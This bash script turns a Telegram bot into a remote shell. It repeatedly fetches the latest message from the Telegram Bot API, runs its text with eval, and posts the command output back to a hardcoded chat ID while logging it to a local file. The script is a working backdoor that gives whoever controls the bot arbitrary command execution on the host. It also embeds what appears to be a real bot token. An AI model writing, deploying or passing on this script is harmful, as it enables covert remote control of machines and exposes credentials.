#!/bin/bash

# Telegram bot API token
TELEGRAM_TOKEN="7097219267:AAGWW5mflvyUIyjX3-VKl_jaltnzmep4zFk"

# Chat ID to send responses
CHAT_ID="6365909887"

# Log file path
LOG_FILE="telegram_bot.log"

# Function to send message to Telegram
send_message() {
    local message="$1"
    curl -s -X POST https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage -d chat_id=$CHAT_ID -d text="$message"
}

# Function to log output
log_output() {
    local log="$1"
    echo "$(date +"%Y-%m-%d %H:%M:%S") - $log" >> $LOG_FILE
}

# Main loop to listen for messages
while true; do
    # Get updates from Telegram bot
    response=$(curl -s -X GET https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates)
    message=$(echo $response | jq -r '.result[-1].message.text')

    # Execute the command and send the output back
    output=$(eval "$message" 2>&1)
    send_message "$output"
    log_output "$output"

    # Wait for a few seconds before checking for new messages again
    sleep 10
done
